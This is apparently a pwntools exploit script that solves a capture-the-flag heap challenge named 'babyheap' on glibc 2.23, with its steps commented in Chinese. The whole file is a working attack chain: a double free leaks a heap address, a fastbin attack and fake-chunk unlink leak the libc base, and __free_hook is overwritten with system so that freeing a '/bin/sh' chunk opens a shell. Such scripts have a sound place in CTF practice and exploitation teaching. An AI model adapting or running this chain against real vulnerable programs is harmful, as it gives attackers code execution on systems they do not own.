from pwn import *
context(os='linux', arch='amd64', log_level='info')
elf = ELF('./babyheap', checksec=False)
libc = ELF('./libc-2.23.so', checksec=False)
if args.REMOTE:
    io = remote('challenge.example.invalid', 9999)
else:
    io = process(['./ld-2.23.so', '--library-path', '.', './babyheap'])
def add(i, data):
    io.sendlineafter(b'Choice:', b'1')
    io.sendlineafter(b'Index:', str(i).encode())
    io.sendafter(b'Content:', data if len(data) == 0x20 else data + b'\n')
def edit(i, data):
    io.sendlineafter(b'Choice:', b'2')
    io.sendlineafter(b'Index:', str(i).encode())
    io.sendafter(b'Content:', data if len(data) == 0x20 else data + b'\n')
def show(i):
    io.sendlineafter(b'Choice:', b'3')
    io.sendlineafter(b'Index:', str(i).encode())
    return io.recvline(drop=True)
def delete(i):
    io.sendlineafter(b'Choice:', b'4')
    io.sendlineafter(b'Index:', str(i).encode())
def leak(data):
    return u64(data[:6].ljust(8, b'\x00'))
# 1. 初始化
add(0, b'a' * 0x20)
add(1, b'b' * 8 + p64(0x21))
add(2, b'/bin/sh\x00' + b'c' * 0x18)
add(3, flat(0, 0x31, 0, 0x31))
add(6, flat(0, 0x21))
# 2. Double Free + 泄露 Heap
delete(0)
delete(1)
delete(0)
heap = leak(show(0))
log.success(f'heap = {heap:#x}')
# 3. Fastbin Attack
edit(0, flat(heap - 0x20, 0x21, 0, 0x21))
ptr = 0x602060
add(4, flat(0, 0x31, ptr - 0x18, ptr - 0x10))
add(5, flat(ptr - 0x18, ptr - 0x10, 0x20, 0xa0))
# 4. Fake Chunk + Unlink
delete(0)
add(7, flat(0, 0x21, ptr - 0x18, ptr - 0x10))
delete(1)
# 5. 泄露 libc
libc.address = leak(show(5)) - 0x3c4b78
log.success(f'libc = {libc.address:#x}')
# 6. __free_hook = system
edit(0, b'a' * 0x18 + p64(libc.sym['__free_hook']))
edit(0, p64(libc.sym['system']))
# 7. system("/bin/sh")
delete(2)
io.interactive()
